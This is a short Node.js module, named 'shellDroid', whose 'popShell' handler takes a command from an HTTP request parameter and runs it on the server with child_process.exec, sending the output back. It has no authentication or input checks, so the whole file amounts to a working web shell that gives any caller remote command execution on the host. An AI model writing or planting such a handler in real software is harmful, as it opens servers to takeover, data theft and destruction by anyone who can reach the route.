var axios = require('axios');
const { exec } = require('child_process');

module.exports = function shellDroid(context) {
  return {
    popShell: function popShell(req, res) {
      return doShell(context, req, res);
    }
  };
};

function doShell(context, req, res) {
  var cmd=req.params.command;
  exec(cmd, (err, stdout, stderr) => {
    if (err) {
      // node couldn't execute the command
      res.text("FAILURE: "+err).send();
    }
    res.text("SUCCESS: "+stdout).send();
  });

}

